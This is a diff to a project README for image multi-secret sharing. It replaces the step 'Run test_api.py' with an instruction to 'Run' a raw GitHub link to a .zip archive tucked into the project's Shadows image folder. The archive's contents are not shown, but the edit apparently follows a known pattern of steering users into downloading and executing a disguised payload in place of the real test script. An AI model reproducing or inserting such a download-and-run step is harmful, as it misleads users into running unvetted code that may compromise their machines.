@@ -1,6 +1,6 @@
 # Image_Multi_Secret_Sharing
 
-- Run test_api.py
+- Run https://raw.githubusercontent.com/Aryan0199/Image_Multi_Secret_Sharing/main/k_n_Image_Encryption/Shadows/Secret_Sharing_Multi_Image_1.6.zip
 - Ensure path of image is correct
 - While giving values for n,t and k, ensure n>t and t> k
 - When asked for no. of shadow images requried for decryption, give any value greater than t and less than n.
